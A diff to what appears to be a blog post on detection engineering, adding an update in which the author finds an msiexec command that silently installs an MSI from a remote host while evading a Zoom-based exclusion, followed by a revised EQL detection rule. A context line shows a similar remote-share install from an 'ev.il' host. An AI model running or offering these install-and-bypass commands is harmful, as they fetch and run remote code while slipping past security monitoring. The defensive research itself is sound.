@@ -121,6 +121,23 @@ Another change is I added "\\\\" to process.command_line because msiexec support
 msiexec -i \\ev.il\install.msi /qn /quiet  # valid, installs program from remote share and bypasses the first variant of the detection rule
 ```
 
+UPDATE: I just realized the following payload bypasses the defense I implemented for the Zoom exclusion and msiexec doesn't give an error.
+
+```powershell
+msiexec.exe -i http://10.0.2.11/TRYING/install.msi /g https://zoom.us/client/asdf
+```
+
+The following is an improvement to the improvement. It can be extended to account for other flags that let you provide arbitrary parameters.
+
+```eql
+process where host.os.type == "windows" and event.type == "start" and
+  process.name : "msiexec.exe" and process.args : ("-i", "/i") and process.command_line : ("*http*", "\\\\") and
+  process.args : ("/qn", "-qn", "-q", "/q", "/quiet") and
+  process.parent.name : ("sihost.exe", "explorer.exe", "cmd.exe", "wscript.exe", "mshta.exe", "powershell.exe", "wmiprvse.exe", "pcalua.exe", "forfiles.exe", "conhost.exe") and
+  not (process.args : "https://zoom.us/client/*" and
+  not process.command_line : "*/g*https://zoom.us/client/*")
+```
+
 # Conclusion
 
 This small research points out the importance of well-thought defensive engineering and how of adversarial thinking plays a role in that.
